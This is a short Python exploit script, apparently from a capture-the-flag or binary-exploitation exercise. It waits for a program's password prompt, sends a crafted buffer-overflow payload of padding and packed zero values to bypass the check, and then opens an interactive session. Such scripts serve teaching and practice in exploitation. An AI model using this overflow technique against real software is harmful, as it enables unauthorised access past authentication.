import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
p.readuntil("password:")
p.sendline('A'*17+p64(0)+'A'*14+'A'*17+p64(0))

p.interactive()
